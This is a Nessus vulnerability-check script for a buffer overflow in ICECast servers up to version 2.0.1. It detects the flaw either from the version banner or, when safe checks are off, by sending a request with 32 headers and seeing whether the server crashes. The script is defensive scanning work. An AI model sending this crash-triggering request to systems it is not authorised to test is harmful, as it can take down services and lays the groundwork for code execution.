#
# (C) Tenable Network Security
#


if(description)
{
 script_id(14843);
 script_cve_id("CVE-2004-1561");
 script_bugtraq_id(11271);
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "ICECast HTTP Header Buffer Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote server runs a version of ICECast which is as old as or older
than version 2.0.1.

This version is vulnerable to an HTTP header buffer overflow vulnerability
which may allow an attacker to execute arbitrary code on the remote host with
the privileges of the icecast server process.

To exploit this flaw, an attacker needs to send 32 HTTP headers to the
remote host to overwrite a return address on the stack.

Solution : Upgrade to ICECast 2.0.2 or newer
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "check icecast version";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
		
 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8000);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:8000);
if(!port) exit(0);

if ( safe_checks() )
{
banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if(egrep(pattern:"^Server: icecast/2\.0\.[0-1][^0-9]", string:banner, icase:TRUE))
      security_hole(port);
}
else
{
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);

req = string("GET / HTTP/1.1\r\nHost: localhost\r\n");
for ( i = 0 ; i < 31 ; i ++ ) req += string("Header", i, ": fooBar\r\n");
req += string("\r\n");
send(socket:soc, data:req);
r = recv(socket:soc, length:4096);
if ( r ) exit(0);
close(soc);

soc = open_sock_tcp(port);
if ( ! soc ) security_hole(port);
else close(soc);
}
